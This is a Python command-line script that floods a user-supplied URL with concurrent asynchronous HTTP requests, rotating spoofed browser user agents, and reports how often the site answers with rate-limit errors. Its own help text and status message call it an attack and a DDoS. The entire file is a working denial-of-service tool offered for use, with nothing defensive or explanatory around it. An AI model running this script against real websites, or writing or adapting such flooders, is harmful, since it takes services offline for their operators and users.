
from random import choice
import argparse
import httpx
import asyncio
from rich.console import Console
import validators


async def random_user_agent():
    user_agents = (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 '
        'Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 '
        'Safari/537.36 Edg/114.0.1788.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 '
        'Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile '
        'Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 '
        'Mobile Safari/537.36 EdgA/46.3.4.5155',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 '
        'Safari/537.36 Vivaldi/3.7')

    return choice(user_agents)


async def request_one(session, url):
    user_agent = await random_user_agent()
    try:
        responses = await session.get(url, headers={'User-agent': user_agent})
    except (httpx.ConnectTimeout, httpx.ConnectError):
        return False
    return responses.status_code


async def send_request(url, request_num):
    """
    this funtion send request async to the url
    with the number of time that the user want
    :param url: the url to send the request to
    :param request_num: number of request to send
    :return:
    """
    async with httpx.AsyncClient(timeout=3) as client:
        tasks = [request_one(client, url) for _ in range(request_num)]
        result = await asyncio.gather(*tasks)
        return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', type=str, help='the url to attack')
    parser.add_argument('num', type=int, help='how match request to send')
    args = parser.parse_args()
    if validators.url(args.url):
        console = Console()
        with console.status('start ddos'):
            res = asyncio.run(send_request(args.url, args.num))
            success = 0
            site_down = 0
            for i in res:
                if i in [200, 301, 302, 404, 400]:
                    success += 1
                elif i == 429:
                    site_down += 1
            print(f'successfully request {success}')
            print(f'web site down status {site_down}')
            print(f'failed request {args.num - success + site_down}')
            exit()
    print('Invalid url try different url')


if __name__ == '__main__':
    main()
